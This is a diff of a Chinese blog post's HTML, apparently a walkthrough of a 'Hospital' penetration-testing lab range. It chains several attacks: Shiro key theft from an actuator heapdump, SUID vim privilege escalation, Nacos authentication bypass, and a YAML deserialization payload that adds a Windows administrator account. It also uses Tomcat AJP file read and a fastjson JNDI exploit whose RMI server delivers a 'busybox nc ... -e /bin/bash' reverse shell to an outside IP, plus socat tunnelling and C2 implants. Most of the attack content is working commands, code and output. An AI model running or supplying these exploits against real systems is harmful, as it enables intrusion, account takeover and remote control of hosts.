@@ -1117,7 +1117,7 @@ root@web03:~# ip a
 <meta property="og:url" content="https://faabbi.github.io/post/Hospital.html">
 <meta property="og:image" content="https://avatars.githubusercontent.com/u/99706997?v=4">
 <title>Hospital</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -1141,17 +1141,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-.copy-feedback {
-    display: none;
-    position: absolute;
-    top: 10px;
-    right: 50px;
-    color: var(--color-fg-on-emphasis);
-    background-color: var(--color-fg-muted);
-    border-radius: 3px;
-    padding: 5px 8px;
-    font-size: 12px;
-}
+
 </style>
 
 
@@ -1185,30 +1175,31 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>信息收集</h1>
 <h2>TCP</h2>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> nmap --min-rate 10000 -p1-65535 39.99.137.181</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─# nmap --min-rate 10000 -p1-65535 39.99.137.181
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-25 21:24 CST
 Warning: 39.99.137.181 giving up on port because retransmission cap hit (10).
-Nmap scan report <span class="pl-k">for</span> 39.99.137.181
+Nmap scan report for 39.99.137.181
 Host is up (0.063s latency).
 Not shown: 57424 closed tcp ports (reset), 8109 filtered tcp ports (no-response)
 PORT     STATE SERVICE
 22/tcp   open  ssh
 8080/tcp open  http-proxy
 
-Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 53.01 seconds</pre></div>
+Nmap done: 1 IP address (1 host up) scanned in 53.01 seconds
+</code></pre>
 <p>就开放了22和8080，详细识别下8080，并且看看OS</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> nmap -sV -sC -O -p8080 39.99.137.181</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─# nmap -sV -sC -O -p8080 39.99.137.181
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-25 21:26 CST
-Nmap scan report <span class="pl-k">for</span> 39.99.137.181
+Nmap scan report for 39.99.137.181
 Host is up (0.025s latency).
 
 PORT     STATE SERVICE VERSION
 8080/tcp open  http    Apache Tomcat (language: en)
-<span class="pl-k">|</span> http-title: <span class="pl-cce">\x</span>E5<span class="pl-cce">\x</span>8C<span class="pl-cce">\x</span>BB<span class="pl-cce">\x</span>E7<span class="pl-cce">\x</span>96<span class="pl-cce">\x</span>97<span class="pl-cce">\x</span>E7<span class="pl-cce">\x</span>AE<span class="pl-cce">\x</span>A1<span class="pl-cce">\x</span>E7<span class="pl-cce">\x</span>90<span class="pl-cce">\x</span>86<span class="pl-cce">\x</span>E5<span class="pl-cce">\x</span>90<span class="pl-cce">\x</span>8E<span class="pl-cce">\x</span>E5<span class="pl-cce">\x</span>8F<span class="pl-cce">\x</span>B0
-<span class="pl-k">|</span>_Requested resource was http://39.99.137.181:8080/login<span class="pl-k">;</span>jsessionid=7D215B0E9FC433A1E7712A81276AB9A2
-<span class="pl-k">|</span>_http-trane-info: Problem with XML parsing of /evox/about
+| http-title: \xE5\x8C\xBB\xE7\x96\x97\xE7\xAE\xA1\xE7\x90\x86\xE5\x90\x8E\xE5\x8F\xB0
+|_Requested resource was http://39.99.137.181:8080/login;jsessionid=7D215B0E9FC433A1E7712A81276AB9A2
+|_http-trane-info: Problem with XML parsing of /evox/about
 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
 Device type: general purpose
 Running: Linux 4.X
@@ -1216,39 +1207,41 @@ OS CPE: cpe:/o:linux:linux_kernel:4
 OS details: Linux 4.19 - 5.15
 Network Distance: 11 hops
 
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="pl-c1">.</span>
-Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 14.96 seconds</pre></div>
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.96 seconds
+</code></pre>
 <p>仅此而已了</p>
 <h2>UDP</h2>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> nmap -sU --top-ports 20 39.99.137.181</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─# nmap -sU --top-ports 20 39.99.137.181
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-25 21:24 CST
-Nmap scan report <span class="pl-k">for</span> 39.99.137.181
+Nmap scan report for 39.99.137.181
 Host is up (0.15s latency).
 
 PORT      STATE         SERVICE
 53/udp    closed        domain
 67/udp    closed        dhcps
-68/udp    open<span class="pl-k">|</span>filtered dhcpc
+68/udp    open|filtered dhcpc
 69/udp    closed        tftp
 123/udp   closed        ntp
-135/udp   open<span class="pl-k">|</span>filtered msrpc
-137/udp   open<span class="pl-k">|</span>filtered netbios-ns
-138/udp   open<span class="pl-k">|</span>filtered netbios-dgm
-139/udp   open<span class="pl-k">|</span>filtered netbios-ssn
+135/udp   open|filtered msrpc
+137/udp   open|filtered netbios-ns
+138/udp   open|filtered netbios-dgm
+139/udp   open|filtered netbios-ssn
 161/udp   closed        snmp
 162/udp   closed        snmptrap
-445/udp   open<span class="pl-k">|</span>filtered microsoft-ds
+445/udp   open|filtered microsoft-ds
 500/udp   closed        isakmp
 514/udp   closed        syslog
-520/udp   open<span class="pl-k">|</span>filtered route
+520/udp   open|filtered route
 631/udp   closed        ipp
 1434/udp  closed        ms-sql-m
-1900/udp  open<span class="pl-k">|</span>filtered upnp
+1900/udp  open|filtered upnp
 4500/udp  closed        nat-t-ike
 49152/udp closed        unknown
 
-Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 23.68 seconds</pre></div>
+Nmap done: 1 IP address (1 host up) scanned in 23.68 seconds
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/6bee4d1c-0c81-450c-918c-5f3bec60bc89"><img width="1892" height="950" alt="Image" src="https://github.com/user-attachments/assets/6bee4d1c-0c81-450c-918c-5f3bec60bc89" style="max-width: 100%; height: auto; max-height: 950px;"></a></p>
 <p>前台有弱密码，不过没什么用处</p>
 <pre lang="text" class="notranslate"><code class="notranslate"># Whitelabel Error Page
@@ -1262,8 +1255,8 @@ There was an unexpected error (type=Not Found, status=404).
 No message available
 </code></pre>
 <p>随便改下路由就有经典报错，可以看看有没有什么信息泄露</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(.venv)─(root㉿MJ)-[~/tools/SpringBoot-Scan]
-└─<span class="pl-c"><span class="pl-c">#</span> cat urlout.txt</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(.venv)─(root㉿MJ)-[~/tools/SpringBoot-Scan]
+└─# cat urlout.txt
 http://39.99.137.181:8080/actuator
 http://39.99.137.181:8080/actuator/beans
 http://39.99.137.181:8080/actuator/caches
@@ -1275,20 +1268,22 @@ http://39.99.137.181:8080/actuator/loggers
 http://39.99.137.181:8080/actuator/metrics
 http://39.99.137.181:8080/actuator/mappings
 http://39.99.137.181:8080/actuator/scheduledtasks
-http://39.99.137.181:8080/actuator/threaddump</pre></div>
+http://39.99.137.181:8080/actuator/threaddump
+</code></pre>
 <p>这些了，访问<code class="notranslate">http://39.99.137.181:8080/actuator/</code>可以看到heapdump，wget下来找下key</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">===========================================
+<pre lang="bash" class="notranslate"><code class="notranslate">===========================================
 CookieRememberMeManager(ShiroKey)
 -------------
 algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES
 
-===========================================</pre></div>
+===========================================
+</code></pre>
 <h1>WEB</h1>
 <p>shiro反序列化<br>
 直接工具就能找到链子，没什么说的baby难度的外网打点，busybox反弹shell就行</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/1645b88b-f190-4159-8bde-6bb6bd2c844a"><img width="1003" height="825" alt="Image" src="https://github.com/user-attachments/assets/1645b88b-f190-4159-8bde-6bb6bd2c844a" style="max-width: 100%; height: auto; max-height: 825px;"></a></p>
 <h1>提权</h1>
-<div class="highlight highlight-source-shell"><pre class="notranslate">app@web01:/$ find / -perm -4000 <span class="pl-k">2&gt;</span>/dev/null
+<pre lang="bash" class="notranslate"><code class="notranslate">app@web01:/$ find / -perm -4000 2&gt;/dev/null
 /usr/bin/vim.basic
 /usr/bin/su
 /usr/bin/newgrp
@@ -1305,12 +1300,13 @@ algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES
 /usr/bin/mount
 /usr/lib/openssh/ssh-keysign
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/eject/dmcrypt-get-device</pre></div>
+/usr/lib/eject/dmcrypt-get-device
+</code></pre>
 <p>vim的suid，提权就很简单了，不过它这里编辑passwd的时候<code class="notranslate">:wq</code>没法保存，必须得用<code class="notranslate">:wq!</code>不知道什么原因</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">app@web01:/$ vim.basic /etc/passwd
+<pre lang="bash" class="notranslate"><code class="notranslate">app@web01:/$ vim.basic /etc/passwd
 app@web01:/$ su toor
 Password:
-root@web01:/<span class="pl-c"><span class="pl-c">#</span> cat /root/flag/flag01.txt</span>
+root@web01:/# cat /root/flag/flag01.txt
 O))     O))                              O))             O))
 O))     O))                          O)  O))             O))
 O))     O))   O))     O)))) O) O))     O)O) O)   O))     O))
@@ -1321,7 +1317,8 @@ O))     O))   O))    O)) O))O))     O))   O))   O)) O)))O)))
                             O))
 flag01: flag{798f3c5b-aabc-4fcc-b7f3-1940e4a6d194}
 
-root@web01:/<span class="pl-c"><span class="pl-c">#</span></span></pre></div>
+root@web01:/#
+</code></pre>
 <p>上线vshell搭个隧道打内网就行</p>
 <h1>内网</h1>
 <p>筛一下有用信息</p>
@@ -1353,7 +1350,7 @@ start vulscan
 </code></pre>
 <h2>172.30.12.6</h2>
 <p>fscan进行全端口扫描看看</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">172.30.12.6:445 open
+<pre lang="bash" class="notranslate"><code class="notranslate">172.30.12.6:445 open
 172.30.12.6:139 open
 172.30.12.6:135 open
 172.30.12.6:3389 open
@@ -1366,135 +1363,143 @@ start vulscan
 172.30.12.6:49669 open
 172.30.12.6:49675 open
 172.30.12.6:49679 open
-172.30.12.6:49686 open</pre></div>
+172.30.12.6:49686 open
+</code></pre>
 <p>基本确定win了，高端口大概率都是rpc，3389开了个rdp</p>
 <p>先前可以看到poc扫描存在认证绕过</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@web01:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> curl -X POST -H 'User-Agent: Nacos-Server' -d 'username=demo&amp;password=demo' http://172.30.12.6:</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">root@web01:~# curl -X POST -H 'User-Agent: Nacos-Server' -d 'username=demo&amp;password=demo' http://172.30.12.6:
 8848/nacos/v1/auth/users
-{<span class="pl-s"><span class="pl-pds">"</span>code<span class="pl-pds">"</span></span>:200,<span class="pl-s"><span class="pl-pds">"</span>message<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>create user ok!<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>data<span class="pl-pds">"</span></span>:null}</pre></div>
+{"code":200,"message":"create user ok!","data":null}
+</code></pre>
 <p>创建新用户，<code class="notranslate">demo:demo</code>，不过这些还不够拿shell</p>
 <p><a href="https://www.freebuf.com/articles/web/428863.html" rel="nofollow">Nacos漏洞汇总复现 - FreeBuf网络安全行业门户</a></p>
 <p>这篇文章能搜到有yaml反序列化，其实也就是这个，怎么判断，我只能说尝试，因为反序列化这种，明显特征不多，有可能的都试一下，我尝试了sql以及内存马，不过sql在注入内存马过程中失败，内存马直接打没效果</p>
 <p>可以拿到yaml反序列化的payload，不过源码中只是弹个计算器，改成加个新用户，这里有个坑用户的密码不能太简单，不然没法创建</p>
-<div class="highlight highlight-source-java"><pre class="notranslate">┌──(<span class="pl-smi">root</span>㉿<span class="pl-c1">MJ</span>)-[/<span class="pl-s1">tmp</span>/<span class="pl-s1">test</span>/<span class="pl-s1">yaml</span>-<span class="pl-s1">payload</span>/<span class="pl-s1">src</span>/<span class="pl-s1">artsploit</span>]
-└─# <span class="pl-smi">cat</span> <span class="pl-s1">AwesomeScriptEngineFactory</span>.<span class="pl-s1">java</span>
-<span class="pl-k">package</span> <span class="pl-s1">artsploit</span>;
+<pre lang="java" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test/yaml-payload/src/artsploit]
+└─# cat AwesomeScriptEngineFactory.java
+package artsploit;
 
-<span class="pl-k">import</span> <span class="pl-s1">javax</span>.<span class="pl-s1">script</span>.<span class="pl-s1">ScriptEngine</span>;
-<span class="pl-k">import</span> <span class="pl-s1">javax</span>.<span class="pl-s1">script</span>.<span class="pl-s1">ScriptEngineFactory</span>;
-<span class="pl-k">import</span> <span class="pl-s1">java</span>.<span class="pl-s1">io</span>.<span class="pl-s1">IOException</span>;
-<span class="pl-k">import</span> <span class="pl-s1">java</span>.<span class="pl-s1">util</span>.<span class="pl-s1">List</span>;
+import javax.script.ScriptEngine;
+import javax.script.ScriptEngineFactory;
+import java.io.IOException;
+import java.util.List;
 
-<span class="pl-k">public</span> <span class="pl-k">class</span> <span class="pl-smi">AwesomeScriptEngineFactory</span> <span class="pl-k">implements</span> <span class="pl-smi">ScriptEngineFactory</span> {
+public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
 
-    <span class="pl-k">public</span> <span class="pl-smi">AwesomeScriptEngineFactory</span>() {
-        <span class="pl-k">try</span> {
-            <span class="pl-smi">Runtime</span>.<span class="pl-en">getRuntime</span>().<span class="pl-en">exec</span>(<span class="pl-s">"net user mj a159753. /add"</span>);
-            <span class="pl-smi">Runtime</span>.<span class="pl-en">getRuntime</span>().<span class="pl-en">exec</span>(<span class="pl-s">"net localgroup administrators mj /add"</span>);
-        } <span class="pl-k">catch</span> (<span class="pl-smi">IOException</span> <span class="pl-s1">e</span>) {
-            <span class="pl-s1">e</span>.<span class="pl-en">printStackTrace</span>();
+    public AwesomeScriptEngineFactory() {
+        try {
+            Runtime.getRuntime().exec("net user mj a159753. /add");
+            Runtime.getRuntime().exec("net localgroup administrators mj /add");
+        } catch (IOException e) {
+            e.printStackTrace();
         }
     }
 
-    <span class="pl-c1">@</span><span class="pl-c1">Override</span>
-    <span class="pl-k">public</span> <span class="pl-smi">String</span> <span class="pl-en">getEngineName</span>() {
-        <span class="pl-k">return</span> <span class="pl-c1">null</span>;
+    @Override
+    public String getEngineName() {
+        return null;
     }
 
-    <span class="pl-c1">@</span><span class="pl-c1">Override</span>
-    <span class="pl-k">public</span> <span class="pl-smi">String</span> <span class="pl-en">getEngineVersion</span>() {
-        <span class="pl-k">return</span> <span class="pl-c1">null</span>;
+    @Override
+    public String getEngineVersion() {
+        return null;
     }
 
-    <span class="pl-c1">@</span><span class="pl-c1">Override</span>
-    <span class="pl-k">public</span> <span class="pl-smi">List</span>&lt;<span class="pl-smi">String</span>&gt; <span class="pl-en">getExtensions</span>() {
-        <span class="pl-k">return</span> <span class="pl-c1">null</span>;
+    @Override
+    public List&lt;String&gt; getExtensions() {
+        return null;
     }
 
-    <span class="pl-c1">@</span><span class="pl-c1">Override</span>
-    <span class="pl-k">public</span> <span class="pl-smi">List</span>&lt;<span class="pl-smi">String</span>&gt; <span class="pl-en">getMimeTypes</span>() {
-        <span class="pl-k">return</span> <span class="pl-c1">null</span>;
+    @Override
+    public List&lt;String&gt; getMimeTypes() {
+        return null;
     }
 
-    <span class="pl-c1">@</span><span class="pl-c1">Override</span>
-    <span class="pl-k">public</span> <span class="pl-smi">List</span>&lt;<span class="pl-smi">String</span>&gt; <span class="pl-en">getNames</span>() {
-        <span class="pl-k">return</span> <span class="pl-c1">null</span>;
+    @Override
+    public List&lt;String&gt; getNames() {
+        return null;
     }
 
-    <span class="pl-c1">@</span><span class="pl-c1">Override</span>
-    <span class="pl-k">public</span> <span class="pl-smi">String</span> <span class="pl-en">getLanguageName</span>() {
-        <span class="pl-k">return</span> <span class="pl-c1">null</span>;
+    @Override
+    public String getLanguageName() {
+        return null;
     }
 
-    <span class="pl-c1">@</span><span class="pl-c1">Override</span>
-    <span class="pl-k">public</span> <span class="pl-smi">String</span> <span class="pl-en">getLanguageVersion</span>() {
-        <span class="pl-k">return</span> <span class="pl-c1">null</span>;
+    @Override
+    public String getLanguageVersion() {
+        return null;
     }
 
-    <span class="pl-c1">@</span><span class="pl-c1">Override</span>
-    <span class="pl-k">public</span> <span class="pl-smi">Object</span> <span class="pl-en">getParameter</span>(<span class="pl-smi">String</span> <span class="pl-s1">key</span>) {
-        <span class="pl-k">return</span> <span class="pl-c1">null</span>;
+    @Override
+    public Object getParameter(String key) {
+        return null;
     }
 
-    <span class="pl-c1">@</span><span class="pl-c1">Override</span>
-    <span class="pl-k">public</span> <span class="pl-smi">String</span> <span class="pl-en">getMethodCallSyntax</span>(<span class="pl-smi">String</span> <span class="pl-s1">obj</span>, <span class="pl-smi">String</span> <span class="pl-s1">m</span>, <span class="pl-smi">String</span>... <span class="pl-s1">args</span>) {
-        <span class="pl-k">return</span> <span class="pl-c1">null</span>;
+    @Override
+    public String getMethodCallSyntax(String obj, String m, String... args) {
+        return null;
     }
 
-    <span class="pl-c1">@</span><span class="pl-c1">Override</span>
-    <span class="pl-k">public</span> <span class="pl-smi">String</span> <span class="pl-en">getOutputStatement</span>(<span class="pl-smi">String</span> <span class="pl-s1">toDisplay</span>) {
-        <span class="pl-k">return</span> <span class="pl-c1">null</span>;
+    @Override
+    public String getOutputStatement(String toDisplay) {
+        return null;
     }
 
-    <span class="pl-c1">@</span><span class="pl-c1">Override</span>
-    <span class="pl-k">public</span> <span class="pl-smi">String</span> <span class="pl-en">getProgram</span>(<span class="pl-smi">String</span>... <span class="pl-s1">statements</span>) {
-        <span class="pl-k">return</span> <span class="pl-c1">null</span>;
+    @Override
+    public String getProgram(String... statements) {
+        return null;
     }
 
-    <span class="pl-c1">@</span><span class="pl-c1">Override</span>
-    <span class="pl-k">public</span> <span class="pl-smi">ScriptEngine</span> <span class="pl-en">getScriptEngine</span>() {
-        <span class="pl-k">return</span> <span class="pl-c1">null</span>;
+    @Override
+    public ScriptEngine getScriptEngine() {
+        return null;
     }
-}</pre></div>
+}
+</code></pre>
 <p>改完重新打包，传到外网主机上防止内网不出网</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test/yaml-payload]
-└─<span class="pl-c"><span class="pl-c">#</span> javac src/artsploit/AwesomeScriptEngineFactory.java</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test/yaml-payload]
+└─# javac src/artsploit/AwesomeScriptEngineFactory.java
 
 ┌──(root㉿MJ)-[/tmp/test/yaml-payload]
-└─<span class="pl-c"><span class="pl-c">#</span> jar -cvf yaml-payload.jar -C src/ .</span>
+└─# jar -cvf yaml-payload.jar -C src/ .
 added manifest
 ignoring entry META-INF/
 adding: META-INF/services/(in = 0) (out= 0)(stored 0%)
 adding: META-INF/services/javax.script.ScriptEngineFactory(in = 36) (out= 38)(deflated -5%)
 adding: artsploit/(in = 0) (out= 0)(stored 0%)
 adding: artsploit/AwesomeScriptEngineFactory.java(in = 1565) (out= 420)(deflated 73%)
-adding: artsploit/AwesomeScriptEngineFactory.class(in = 1674) (out= 711)(deflated 57%)</pre></div>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@web01:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> python3 -m http.server 8010</span>
+adding: artsploit/AwesomeScriptEngineFactory.class(in = 1674) (out= 711)(deflated 57%)
+</code></pre>
+<pre lang="bash" class="notranslate"><code class="notranslate">root@web01:~# python3 -m http.server 8010
 Serving HTTP on 0.0.0.0 port 8010 (http://0.0.0.0:8010/) ...
-172.30.12.6 - - [25/Dec/2025 22:12:25] <span class="pl-s"><span class="pl-pds">"</span>GET /yaml-payload.jar HTTP/1.1<span class="pl-pds">"</span></span> 200 -</pre></div>
+172.30.12.6 - - [25/Dec/2025 22:12:25] "GET /yaml-payload.jar HTTP/1.1" 200 -
+</code></pre>
 <p>这边收到回显就是有洞</p>
 <p>xfree连上即可</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> pc xfreerdp3 /v:172.30.12.6 /u:mj /p:a159753.</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─# pc xfreerdp3 /v:172.30.12.6 /u:mj /p:a159753.
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-[proxychains] DLL init: proxychains-ng 4.17</pre></div>
+[proxychains] DLL init: proxychains-ng 4.17
+</code></pre>
 <p>还是上线vshell，不过这台机器不出网，在外网主机做个socat到攻击机上的监听端口上线即可</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">./socat TCP-LISTEN:2332,fork TCP:ip:port <span class="pl-k">&amp;</span></pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">./socat TCP-LISTEN:2332,fork TCP:ip:port &amp;
+</code></pre>
 <p>flag在administrator下</p>
 <pre lang="text" class="notranslate"><code class="notranslate">flag02: flag{9fe8b635-c832-40fc-b81d-2cb8d5ddb558}
 </code></pre>
 <h2>172.30.12.236</h2>
 <p>一样的先扫下全端口，不过这个信息不多</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">172.30.12.236:22 open
+<pre lang="bash" class="notranslate"><code class="notranslate">172.30.12.236:22 open
 172.30.12.236:8009 open
 172.30.12.236:8080 open
-[<span class="pl-k">*</span>] alive ports len is: 3
+[*] alive ports len is: 3
 start vulscan
-[<span class="pl-k">*</span>] WebTitle http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台</pre></div>
+[*] WebTitle http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台
+</code></pre>
 <p>仅此而已了</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> pc nmap -p8080,8009 172.30.12.236 -Pn</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─# pc nmap -p8080,8009 172.30.12.236 -Pn
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 [proxychains] DLL init: proxychains-ng 4.17
@@ -1502,51 +1507,55 @@ start vulscan
 [proxychains] DLL init: proxychains-ng 4.17
 [proxychains] DLL init: proxychains-ng 4.17
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-25 22:24 CST
-Nmap scan report <span class="pl-k">for</span> 172.30.12.236 (172.30.12.236)
+Nmap scan report for 172.30.12.236 (172.30.12.236)
 Host is up.
 
 PORT     STATE    SERVICE
 8009/tcp filtered ajp13
 8080/tcp filtered http-proxy
 
-Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 3.07 seconds</pre></div>
+Nmap done: 1 IP address (1 host up) scanned in 3.07 seconds
+</code></pre>
 <p>nmap具体识别下8009是tomcat的ajp，随便访问个报错的就能得到版本号</p>
 <p><code class="notranslate">Apache Tomcat/8.5.32</code></p>
 <p>这个版本的tomcat有文件包含和文件读取漏洞，也正是ajp导致的，拿shell思路可以是文件包含个反弹shell文件执行，但是这里没有上传接口，走不通</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test/CVE-2020-1938-Tomact-file_include-file_read]
-└─<span class="pl-c"><span class="pl-c">#</span> pc python2 read.py -p 8009 172.30.12.236 -f '/WEB-INF/web.xml'</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test/CVE-2020-1938-Tomact-file_include-file_read]
+└─# pc python2 read.py -p 8009 172.30.12.236 -f '/WEB-INF/web.xml'
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 [proxychains] DLL init: proxychains-ng 4.17
 [proxychains] Strict chain  ...  211.159.175.21:10002  ...  172.30.12.236:8009  ...  OK
 Getting resource at ajp13://172.30.12.236:8009/asdf
 ----------------------------
-<span class="pl-k">&lt;</span><span class="pl-k">?</span>xml version=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span> encoding=<span class="pl-s"><span class="pl-pds">"</span>UTF-8<span class="pl-pds">"</span></span><span class="pl-k">?</span><span class="pl-k">&gt;</span>
-<span class="pl-k">&lt;</span>web-app<span class="pl-k">&gt;</span>
-    <span class="pl-k">&lt;</span>servlet<span class="pl-k">&gt;</span>
-        <span class="pl-k">&lt;</span>servlet-name<span class="pl-k">&gt;</span>loginServlet<span class="pl-k">&lt;</span>/servlet-name<span class="pl-k">&gt;</span>
-        <span class="pl-k">&lt;</span>servlet-class<span class="pl-k">&gt;</span>com.hospital.fastjson.LoginServlet<span class="pl-k">&lt;</span>/servlet-class<span class="pl-k">&gt;</span>
-    <span class="pl-k">&lt;</span>/servlet<span class="pl-k">&gt;</span>
-    <span class="pl-k">&lt;</span>servlet-mapping<span class="pl-k">&gt;</span>
-        <span class="pl-k">&lt;</span>servlet-name<span class="pl-k">&gt;</span>loginServlet<span class="pl-k">&lt;</span>/servlet-name<span class="pl-k">&gt;</span>
-        <span class="pl-k">&lt;</span>url-pattern<span class="pl-k">&gt;</span>/login<span class="pl-k">&lt;</span>/url-pattern<span class="pl-k">&gt;</span>
-    <span class="pl-k">&lt;</span>/servlet-mapping<span class="pl-k">&gt;</span>
-<span class="pl-k">&lt;</span>/web-app<span class="pl-k">&gt;</span></pre></div>
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;web-app&gt;
+    &lt;servlet&gt;
+        &lt;servlet-name&gt;loginServlet&lt;/servlet-name&gt;
+        &lt;servlet-class&gt;com.hospital.fastjson.LoginServlet&lt;/servlet-class&gt;
+    &lt;/servlet&gt;
+    &lt;servlet-mapping&gt;
+        &lt;servlet-name&gt;loginServlet&lt;/servlet-name&gt;
+        &lt;url-pattern&gt;/login&lt;/url-pattern&gt;
+    &lt;/servlet-mapping&gt;
+&lt;/web-app&gt;
+</code></pre>
 <p>可以看到有fastjson可能有反序列化，可以试一下，看其他佬说如果结构不完全，会报错的</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e053e726-c6a9-40e5-a04b-be1123f4360f"><img width="2000" height="1274" alt="Image" src="https://github.com/user-attachments/assets/e053e726-c6a9-40e5-a04b-be1123f4360f" style="max-width: 100%; height: auto; max-height: 1274px;"></a></p>
 <p>拿个域名能收到响应的，所以这机器大概率应该出网，不过测试发现没出，可能是走代理了，或者只出一个端口</p>
-<div class="highlight highlight-source-json"><pre class="notranslate">{<span class="pl-ent">"qwq"</span>:{<span class="pl-ent">"@type"</span>:<span class="pl-s"><span class="pl-pds">"</span>java.net.Inet4Address<span class="pl-pds">"</span></span>,<span class="pl-ent">"val"</span>:<span class="pl-s"><span class="pl-pds">"</span>sj58vtjj.dns.adysec.com<span class="pl-pds">"</span></span>}}</pre></div>
+<pre lang="json" class="notranslate"><code class="notranslate">{"qwq":{"@type":"java.net.Inet4Address","val":"sj58vtjj.dns.adysec.com"}}
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/aaedd148-198c-4e5f-ba0b-22472aace569"><img width="1526" height="274" alt="Image" src="https://github.com/user-attachments/assets/aaedd148-198c-4e5f-ba0b-22472aace569" style="max-width: 100%; height: auto; max-height: 274px;"></a></p>
 <p>外网web主机运行，服务器开监听</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@web01:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> java -cp jndi_tool.jar jndi.EvilRMIServer 8888 1099 'busybox nc 211.159.175.21 2333 -e /bin/bash'</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">root@web01:~# java -cp jndi_tool.jar jndi.EvilRMIServer 8888 1099 'busybox nc 211.159.175.21 2333 -e /bin/bash'
 [-] rmi_port:8888, socket_port:1099, evilcode: busybox nc ip port -e /bin/bash
 [-] current hostname error: web01
 [-] please enter new hostname(ip)
-<span class="pl-k">&gt;</span> 172.30.12.5
+&gt; 172.30.12.5
 [-] use payload: rmi://172.30.12.5:8888/Object
 [-] Creating SocketFactory on port 1099
 [-] Creating evil RMI registry on port 8888
-[-] waiting target connect RMI SocketFactory ...</pre></div>
+[-] waiting target connect RMI SocketFactory ...
+</code></pre>
 <p>发包</p>
 <pre lang="text" class="notranslate"><code class="notranslate">POST /login HTTP/1.1
 Host: 172.30.12.236:8080
@@ -1575,36 +1584,38 @@ Priority: u=0
 }
 </code></pre>
 <p>成功接到shell，可以写个公钥持久化，上线vshell</p>
